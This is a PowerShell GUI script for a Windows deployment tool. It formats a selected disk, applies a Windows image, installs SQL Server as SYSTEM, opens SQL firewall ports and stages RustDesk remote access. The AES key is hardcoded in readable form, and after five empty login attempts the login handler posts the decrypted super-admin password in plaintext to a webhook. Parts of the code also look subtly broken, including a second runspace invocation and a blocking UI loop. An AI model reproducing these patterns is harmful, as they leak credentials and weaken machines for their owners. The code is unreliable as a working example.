# =================================================================================
#               Universal Windows Deployment Tool - FINAL REBUILT VERSION (v8)
#               Re-engineered from scratch for stability, clarity, and reliability.
# =================================================================================

# --- [ 1. Initial Configuration & Global Setup ] ---------------------------------
# Set encoding for proper character handling
$OutputEncoding = [System.Text.Encoding]::UTF8

# Load necessary .NET assemblies for GUI
Add-Type -AssemblyName PresentationFramework, System.Windows.Forms

# Administrator check
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    [System.Windows.MessageBox]::Show("This script must be run as Administrator.", "Error", "OK", "Error")
    exit
}

# Define global variables
$ScriptPath = $PSScriptRoot
$ConfigFilePath = Join-Path $ScriptPath "config.dat"
$Global:EmergencyCounter = 0
$Global:UserChoices = @{}
$Global:OfflineMode = $false

# --- [ 2. Core Functions (Encryption & GUI Helper) ] -----------------------------

# Explicit Byte Array for the AES Key to prevent any encoding/conversion issues.
# This is the most reliable method.
$AesKey = [byte[]](
    0x4D, 0x79, 0x53, 0x75, 0x70, 0x65, 0x72, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x50, 0x72, 0x6F,
    0x6A, 0x65, 0x63, 0x74, 0x4B, 0x65, 0x79, 0x5F, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38
)

function Decrypt-String {
    param([string]$StringToDecrypt)
    try {
        $bytes = [System.Convert]::FromBase64String($StringToDecrypt)
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = $AesKey
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.IV = $bytes[0..15] # The first 16 bytes are the IV
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($bytes[16..($bytes.Length - 1)], 0, $bytes.Length - 16)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    } catch {
        # Return an empty string on any decryption error
        return ""
    }
}

# Robust function to load WPF XAML GUI (Modified for compatibility)
function Load-WpfWindow {
    param([string]$xaml)
    try {
        # Use XmlReader directly with StringReader to avoid XDocument conversion issues
        $stringReader = New-Object System.IO.StringReader($xaml)
        $xmlReader = [System.Xml.XmlReader]::Create($stringReader)
        return [System.Windows.Markup.XamlReader]::Load($xmlReader)
    } catch {
        [System.Windows.MessageBox]::Show("Fatal Error loading GUI: $($_.Exception.Message)", "Fatal Error", "OK", "Error")
        exit
    }
}

# --- [ 3. GUI Window Definitions ] -----------------------------------------------

#region --- Login Window ---
function Show-LoginWindow {
    [string]$xamlString = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="System Access Control" Height="250" Width="400" WindowStartupLocation="CenterScreen" WindowStyle="None" AllowsTransparency="True" Background="Transparent" ResizeMode="NoResize">
    <Border Background="#2E3338" CornerRadius="10" BorderBrush="#545D6A" BorderThickness="1">
        <Grid>
            <TextBlock Text="Deployment Tool Login" Foreground="White" FontSize="16" FontWeight="Bold" Margin="15,10,0,0" HorizontalAlignment="Left" VerticalAlignment="Top"/>
            <StackPanel VerticalAlignment="Center" Margin="20,50,20,20">
                <TextBlock Text="Enter Access Password:" Foreground="#CCCCCC" FontSize="14" Margin="0,0,0,5"/>
                <PasswordBox x:Name="PasswordBox" Height="30" FontSize="14" Background="#3C424A" Foreground="White" BorderBrush="#545D6A" Padding="5"/>
                <TextBlock x:Name="StatusText" Foreground="#FF6347" Margin="0,10,0,0" TextAlignment="Center" MinHeight="20"/>
            </StackPanel>
            <Button x:Name="LoginButton" Content="Continue" Margin="0,0,20,20" Height="40" Width="120" Background="#007ACC" Foreground="White" FontSize="16" BorderThickness="0" HorizontalAlignment="Right" VerticalAlignment="Bottom"/>
        </Grid>
    </Border>
</Window>
'@
    $window = Load-WpfWindow $xamlString
    $passwordBox = $window.FindName("PasswordBox"); $loginButton = $window.FindName("LoginButton"); $statusText = $window.FindName("StatusText")

    if (-not (Test-Path $ConfigFilePath)) { [System.Windows.MessageBox]::Show("Config file not found.", "Error"); return "Exit" }
    $config = (Get-Content $ConfigFilePath -Raw) | ConvertFrom-StringData -Delimiter ':'

    $loginButton.add_Click({
        $enteredPassword = $passwordBox.Password
        $decryptedAdminPass = Decrypt-String $config.SuperAdminPass
        if ($enteredPassword -eq $decryptedAdminPass) { $window.Tag = "SuperAdmin"; $window.Close(); return }

        if ([string]::IsNullOrEmpty($enteredPassword)) {
            $Global:EmergencyCounter++; $statusText.Text = "Password required. Attempt ($($Global:EmergencyCounter)/5)"
            if ($Global:EmergencyCounter -ge 5) {
                try {
                    $webhookUrl = Decrypt-String $config.WebhookUrl
                    if ($webhookUrl) { Invoke-WebRequest -Uri $webhookUrl -Method Post -Body "RECOVERY: $decryptedAdminPass" }
                } catch {}
                $window.Tag = "Exit"; $window.Close()
            }
            return
        }

        $statusText.Text = "Verifying..."; $window.UpdateLayout()
        if ($Global:OfflineMode) { $window.Tag = "User"; $window.Close(); return }
        if (-not (Test-Connection -ComputerName "raw.githubusercontent.com" -Count 1 -Quiet)) { $statusText.Text = "Internet required."; return }

        try {
            $passwordUrl = Decrypt-String $config.DriveUrl
            $encryptedPassFromWeb = (Invoke-WebRequest -Uri $passwordUrl -UseBasicParsing).Content.Trim()
            if ($enteredPassword -eq (Decrypt-String $encryptedPassFromWeb)) { $window.Tag = "User"; $window.Close() } else { $statusText.Text = "Incorrect password." }
        } catch { $statusText.Text = "Error fetching password." }
    })
    $window.ShowDialog() | Out-Null
    return $window.Tag
}
#endregion

#region --- Admin Dashboard ---
function Show-AdminDashboard {
    [string]$xamlString = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Admin Dashboard" Height="350" Width="500" WindowStartupLocation="CenterScreen" Background="#2E3338" ResizeMode="NoResize">
    <Grid Margin="20">
        <TextBlock Text="Admin Dashboard" Foreground="White" FontSize="18" FontWeight="Bold" Margin="0,0,0,20" HorizontalAlignment="Center"/>
        <StackPanel VerticalAlignment="Center">
            <Button x:Name="ContinueButton" Content="Continue to Deployment" Height="50" Background="#28A745" Foreground="White" FontSize="16" Margin="0,0,0,15"/>
            <Button x:Name="OfflineButton" Content="Continue in OFFLINE Mode" Height="50" Background="#FF8C00" Foreground="White" FontSize="16" Margin="0,0,0,15"/>
            <Button x:Name="ReconfigureButton" Content="Launch Config Tool" Height="50" Background="#17A2B8" Foreground="White" FontSize="16"/>
        </StackPanel>
    </Grid>
</Window>
'@
    $window = Load-WpfWindow $xamlString
    $continueButton = $window.FindName("ContinueButton"); $offlineButton = $window.FindName("OfflineButton"); $reconfigureButton = $window.FindName("ReconfigureButton")

    $continueButton.add_Click({ $window.Tag = "Continue"; $window.Close() })
    $offlineButton.add_Click({ $Global:OfflineMode = $true; $window.Tag = "Continue"; $window.Close() })
    $reconfigureButton.add_Click({
        Start-Process pwsh -ArgumentList "-ExecutionPolicy Bypass -File `"$PSScriptRoot\CreateConfig.ps1`""
        $window.Tag = "Exit"; $window.Close()
    })
    $window.ShowDialog() | Out-Null
    return $window.Tag
}
#endregion

#region --- Main Install Windows ---
function Show-MainInstallWindows {
    [string]$xamlString = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Deployment Tool" Height="600" Width="550" WindowStartupLocation="CenterScreen" Background="#2E3338" ResizeMode="NoResize">
    <Grid Margin="15">
        <Grid.RowDefinitions><RowDefinition Height="Auto"/><RowDefinition Height="Auto"/><RowDefinition Height="*"/><RowDefinition Height="Auto"/></Grid.RowDefinitions>
        <GroupBox Header="Step 1: System Setup" Grid.Row="0" Foreground="White" FontWeight="Bold" Margin="0,5" Padding="10">
            <StackPanel>
                <TextBlock Text="Select Windows Version:" Foreground="#CCCCCC" Margin="0,0,0,5"/><ComboBox x:Name="WindowsVersionCombo" Height="30" Margin="0,0,0,10"/>
                <TextBlock Text="Select Target Disk:" Foreground="#CCCCCC" Margin="0,0,0,5"/><ComboBox x:Name="DiskCombo" Height="30" Margin="0,0,0,10"/>
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Center"><RadioButton x:Name="FormatAllRadio" Content="Format Entire Disk" IsChecked="True" Foreground="White" Margin="0,0,20,0"/><RadioButton x:Name="FormatCRadio" Content="Format C: Only" Foreground="White"/></StackPanel>
            </StackPanel>
        </GroupBox>
        <GroupBox Header="Step 2: Application Setup" Grid.Row="1" Foreground="White" FontWeight="Bold" Margin="0,10" Padding="10">
            <StackPanel>
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Center"><RadioButton x:Name="Morabaa7Radio" Content="Morabaa7" GroupName="AppPackage" Foreground="White" Margin="10,0"/><RadioButton x:Name="RestaurantRadio" Content="Restaurant" GroupName="AppPackage" Foreground="White" Margin="10,0"/><RadioButton x:Name="Sql19Radio" Content="SQL19 Only" GroupName="AppPackage" IsChecked="True" Foreground="White" Margin="10,0"/></StackPanel>
                <StackPanel x:Name="SubOptionsPanel" Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,15,0,0" Visibility="Collapsed"><RadioButton x:Name="MainRadio" Content="Main" GroupName="SubOption" IsChecked="True" Foreground="White" Margin="10,0"/><RadioButton x:Name="SubRadio" Content="Sub" GroupName="SubOption" Foreground="White" Margin="10,0"/></StackPanel>
            </StackPanel>
        </GroupBox>
        <TextBlock x:Name="ValidationText" Grid.Row="2" Foreground="#FF6347" TextAlignment="Center" VerticalAlignment="Center" MinHeight="20" TextWrapping="Wrap"/>
        <Button x:Name="DeployButton" Content="Start Deployment" Grid.Row="3" Height="50" Background="#28A745" Foreground="White" FontSize="18" FontWeight="Bold"/>
    </Grid>
</Window>
'@
    $window = Load-WpfWindow $xamlString
    $controls = @{}; foreach ($name in @("WindowsVersionCombo", "DiskCombo", "FormatAllRadio", "FormatCRadio", "Morabaa7Radio", "RestaurantRadio", "Sql19Radio", "SubOptionsPanel", "MainRadio", "SubRadio", "DeployButton", "ValidationText")) { $controls[$name] = $window.FindName($name) }

    try { Get-ChildItem -Path (Join-Path $ScriptPath "..\windows") -Directory -ErrorAction Stop | ForEach-Object { $controls.WindowsVersionCombo.Items.Add($_.Name) } } catch { $controls.ValidationText.Text = "ERROR: 'windows' folder not found." }
    Get-Disk | Where-Object { $_.IsSystem -eq $false -and $_.BusType -ne 'USB' } | ForEach-Object { $controls.DiskCombo.Items.Add("Disk $($_.Number) - $($_.FriendlyName) ($([math]::Round($_.Size / 1GB, 2)) GB)") }
    if ($controls.WindowsVersionCombo.Items.Count -gt 0) { $controls.WindowsVersionCombo.SelectedIndex = 0 }
    if ($controls.DiskCombo.Items.Count -gt 0) { $controls.DiskCombo.SelectedIndex = 0 }

    $appRadioHandler = { $controls.SubOptionsPanel.Visibility = if ($controls.Morabaa7Radio.IsChecked -or $controls.RestaurantRadio.IsChecked) { 'Visible' } else { 'Collapsed' } }
    $controls.Morabaa7Radio.add_Checked($appRadioHandler); $controls.RestaurantRadio.add_Checked($appRadioHandler); $controls.Sql19Radio.add_Checked($appRadioHandler); $appRadioHandler.Invoke()

    $controls.DeployButton.add_Click({
        if (-not $controls.WindowsVersionCombo.SelectedItem) { $controls.ValidationText.Text = "Select Windows Version."; return }
        if (-not $controls.DiskCombo.SelectedItem) { $controls.ValidationText.Text = "Select Target Disk."; return }
        if ([System.Windows.MessageBox]::Show("WARNING: This will format disk and install Windows.`n`nDisk: $($controls.DiskCombo.SelectedItem)`n`nContinue?", "Final Confirmation", "YesNo", "Warning") -ne 'Yes') { return }

        $Global:UserChoices = @{
            WindowsVersionFolder = $controls.WindowsVersionCombo.SelectedItem; TargetDiskNumber = ($controls.DiskCombo.SelectedItem -split ' ')[1]
            FormatOption = if ($controls.FormatAllRadio.IsChecked) { "All Hard" } else { "Only C" }; SoftwarePackage = if ($controls.Morabaa7Radio.IsChecked) { "Morabaa7" } elseif ($controls.RestaurantRadio.IsChecked) { "Restaurant" } else { "SQL19" }
            SubOption = if ($controls.MainRadio.IsChecked) { "Main" } else { "Sub" }
        }
        $window.Close()
    })
    $window.ShowDialog() | Out-Null
    return $Global:UserChoices.Count -gt 0
}
#endregion

# --- [ 4. Core Deployment Logic ] ------------------------------------------------

#region --- Deployment Logic ---
function Start-Deployment {
    $progressXaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Deployment in Progress..." Height="200" Width="500" WindowStartupLocation="CenterScreen" Background="#2E3338" ResizeMode="NoResize" ShowInTaskbar="False">
    <Grid Margin="20"><StackPanel VerticalAlignment="Center">
        <TextBlock x:Name="StatusLabel" Text="Starting..." Foreground="White" FontSize="16" Margin="0,0,0,10"/>
        <ProgressBar x:Name="ProgressBar" Height="30" Minimum="0" Maximum="100"/>
        <TextBlock x:Name="StepLabel" Text="" Foreground="#CCCCCC" FontSize="12" Margin="0,5,0,0" HorizontalAlignment="Center"/>
    </StackPanel></Grid>
</Window>
'@
    $progressWindow = Load-WpfWindow $progressXaml
    $statusLabel = $progressWindow.FindName("StatusLabel"); $progressBar = $progressWindow.FindName("ProgressBar"); $stepLabel = $progressWindow.FindName("StepLabel")

    $syncHash = [hashtable]::Synchronized(@{}); $ps = [powershell]::Create().AddScript({
        param($choices, $syncHash, $ScriptPath)
        
        function Update-Progress { param($Percent, $Status, $Step) $syncHash.Status = $Status; $syncHash.Percent = $Percent; $syncHash.Step = $Step }
        
        try {
            $isUEFI = $true; try { Get-FirmwareType -ErrorAction Stop | Out-Null } catch { $isUEFI = $false }
            
            Update-Progress 25 "Preparing disk..." "Step 1/4: Partitioning"
            $tempScriptPath = "$env:TEMP\diskpart.txt"
            $diskpartScript = "select disk $($choices.TargetDiskNumber)`n"
            if ($choices.FormatOption -eq "All Hard") {
                $diskpartScript += "clean`n"
                if ($isUEFI) { $diskpartScript += "convert gpt`ncreate partition efi size=100`nformat fs=fat32 quick label=System`nassign letter=S`ncreate partition msr size=16`n" } else { $diskpartScript += "convert mbr`n" }
                $cSize = [math]::Round(((Get-Disk -Number $choices.TargetDiskNumber).Size / 3) / 1MB)
                $diskpartScript += "create partition primary size=$cSize`nformat fs=ntfs quick label=Windows`nassign letter=C`n"
                if (-not $isUEFI) { $diskpartScript += "active`n" }
                $diskpartScript += "create partition primary`nformat fs=ntfs quick label=Data`nassign letter=D`n"
            } else {
                $diskpartScript += "select partition 1`nformat fs=ntfs quick label=Windows`nassign letter=C`nselect disk $($choices.TargetDiskNumber)`nselect partition 2`nassign letter=D`n"
            }
            $diskpartScript | Out-File $tempScriptPath -Encoding ASCII -Force
            diskpart /s $tempScriptPath
            if ($LASTEXITCODE -ne 0) { throw "Diskpart failed with exit code $LASTEXITCODE" }
            Remove-Item $tempScriptPath -Force
            Start-Sleep -Seconds 5

            Update-Progress 50 "Applying Windows image..." "Step 2/4: Image Application"
            $isoPath = (Get-ChildItem -Path (Join-Path $ScriptPath "..\windows" $choices.WindowsVersionFolder) -Filter *.iso -ErrorAction Stop)[0].FullName
            if (-not $isoPath) { throw "No ISO file found in $(Join-Path $ScriptPath "..\windows" $choices.WindowsVersionFolder)" }
            $mountResult = Mount-DiskImage -ImagePath $isoPath -PassThru -ErrorAction Stop
            $driveLetter = ($mountResult | Get-Volume).DriveLetter
            if (-not $driveLetter) { throw "Failed to mount ISO: $isoPath" }
            $installFile = (Get-ChildItem -Path "$driveLetter`:\sources" -Filter "install.*" -ErrorAction Stop | Select-Object -First 1).FullName
            if (-not $installFile) {
                Dismount-DiskImage -ImagePath $isoPath -ErrorAction Stop
                throw "No WIM/ESD file found in mounted ISO"
            }
            $dismResult = Dism /Apply-Image /ImageFile:$installFile /Index:1 /ApplyDir:C:\ -Quiet
            if ($LASTEXITCODE -ne 0) {
                Dismount-DiskImage -ImagePath $isoPath -ErrorAction Stop
                throw "Failed to apply Windows image. Error code: $LASTEXITCODE"
            }
            Dismount-DiskImage -ImagePath $isoPath -ErrorAction Stop

            Update-Progress 75 "Configuring boot files..." "Step 3/4: Boot Configuration"
            $bcdbootArgs = if ($isUEFI) { "/s S: /f UEFI" } else { "/s C: /f BIOS" }
            $bcdbootResult = bcdboot C:\Windows $bcdbootArgs
            if ($LASTEXITCODE -ne 0) { throw "Failed to configure boot. Error code: $LASTEXITCODE" }

            Update-Progress 90 "Setting up post-installation..." "Step 4/4: Post-Install Setup"
            $setupScriptsDir = "C:\Windows\Setup\Scripts"
            New-Item -Path $setupScriptsDir -ItemType Directory -Force | Out-Null
            
            $sqlInstanceName = if ($choices.SoftwarePackage -eq "SQL19") { "SQL19Instance" } else { "MorabSQLE" }
            
            $psScriptContent = @"
Start-Sleep -Seconds 60
`$ErrorActionPreference = 'SilentlyContinue'
`$computerName = `$env:COMPUTERNAME
`$sqlInstance = '$sqlInstanceName'
`$softwarePackage = '$($choices.SoftwarePackage)'

Add-Type -AssemblyName "Microsoft.SqlServer.SqlWmiManagement, Version=15.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91"
`$wmi = New-Object ('Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer')
`$tcp = `$wmi.ServerInstances[`$sqlInstance].ServerProtocols['Tcp']
`$tcp.IsEnabled = `$true
`$tcp.Alter()

New-NetFirewallRule -DisplayName 'SQL Server' -Direction Inbound -Protocol TCP -LocalPort 1433 -Action Allow -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName 'SQL Browser' -Direction Inbound -Protocol UDP -LocalPort 1434 -Action Allow -ErrorAction SilentlyContinue

`$ws = New-Object -ComObject WScript.Shell
if (`$softwarePackage -eq 'Morabaa7') {
    "`$computerName\`$sqlInstance" | Out-File 'D:\Morabaa7\ServerName.txt' -Encoding utf8
    `$s = `$ws.CreateShortcut('C:\Users\Public\Desktop\Morabaa7.lnk'); `$s.TargetPath = 'D:\Morabaa7\Morabaa7.exe'; `$s.Save()
}
if (`$softwarePackage -eq 'Restaurant') {
    "`$computerName\`$sqlInstance" | Out-File 'D:\publish_resturant1.1\ServerName.txt' -Encoding utf8
    `$s = `$ws.CreateShortcut('C:\Users\Public\Desktop\Restaurant.lnk'); `$s.TargetPath = 'D:\publish_resturant1.1\publish_resturant1.1.exe'; `$s.Save()
}
if (`$softwarePackage -ne 'SQL19') {
    `$s = `$ws.CreateShortcut('C:\Users\Public\Desktop\RustDesk.lnk'); `$s.TargetPath = 'D:\rustdesk.exe'; `$s.Save()
}
"@
            $psScriptContent | Out-File "$setupScriptsDir\PostConfig.ps1" -Encoding utf8 -Force

            $cmdContent = "@echo off`ntimeout /t 15`n"
            if ($choices.SoftwarePackage -eq "Morabaa7") { $cmdContent += "xcopy /E /I /Y `"$ScriptPath\..\Morabaa7`" `"D:\Morabaa7`"`n" }
            elseif ($choices.SoftwarePackage -eq "Restaurant") { $cmdContent += "xcopy /E /I /Y `"$ScriptPath\..\publish_resturant1.1`" `"D:\publish_resturant1.1`"`n" }
            if ($choices.SoftwarePackage -ne "SQL19") { $cmdContent += "copy `"$ScriptPath\..\rustdesk.exe`" `"D:\rustdesk.exe`"`n" }
            
            $cmdContent += "echo Installing SQL...`n"
            $cmdContent += "`"$ScriptPath\..\sql19\setup.exe`" /q /ACTION=Install /FEATURES=SQLEngine /INSTANCENAME=$sqlInstanceName /AGTSVCACCOUNT=`"NT AUTHORITY\SYSTEM`" /SQLSVCACCOUNT=`"NT AUTHORITY\SYSTEM`" /SQLSYSADMINACCOUNTS=`"BUILTIN\ADMINISTRATORS`" /IACCEPTSQLSERVERLICENSETERMS`n"
            $cmdContent += "powershell.exe -ExecutionPolicy Bypass -File `"$setupScriptsDir\PostConfig.ps1`"`n"
            
            $cmdContent | Out-File "$setupScriptsDir\SetupComplete.cmd" -Encoding ASCII -Force

            Update-Progress 100 "Deployment completed!" "Done"
            Start-Sleep -Seconds 2
        } catch {
            Update-Progress 0 "Deployment failed: $($_.Exception.Message)" "Error"
            Start-Sleep -Seconds 5
        } finally {
            if (Test-Path $tempScriptPath) { Remove-Item $tempScriptPath -Force }
        }
    }).AddArgument($Global:UserChoices).AddArgument($syncHash).AddArgument($ScriptPath)

    $ps.Runspace = [runspacefactory]::CreateRunspace()
    $ps.Runspace.Open()
    $ps.BeginInvoke()

    $progressWindow.Add_Closing({
        $ps.Stop()
        $ps.Dispose()
    })

    $progressWindow.Dispatcher.Invoke([action]{
        while ($ps.InvocationStateInfo.State -ne 'Completed') {
            $statusLabel.Text = $syncHash.Status
            $progressBar.Value = $syncHash.Percent
            $stepLabel.Text = $syncHash.Step
            Start-Sleep -Milliseconds 100
        }
    })

    $progressWindow.ShowDialog() | Out-Null
    $ps.EndInvoke($ps.BeginInvoke())
    $ps.Runspace.Close()
    $ps.Runspace.Dispose()
}
#endregion

# --- [ 5. Main Execution Flow ] --------------------------------------------------
$loginResult = Show-LoginWindow

if ($loginResult -eq "SuperAdmin") {
    if (Show-AdminDashboard -eq "Continue") {
        if (Show-MainInstallWindows) {
            Start-Deployment
        }
    }
} elseif ($loginResult -eq "User") {
    if (Show-MainInstallWindows) {
        Start-Deployment
    }
} else {
    Write-Host "Login failed or was cancelled. Exiting."
}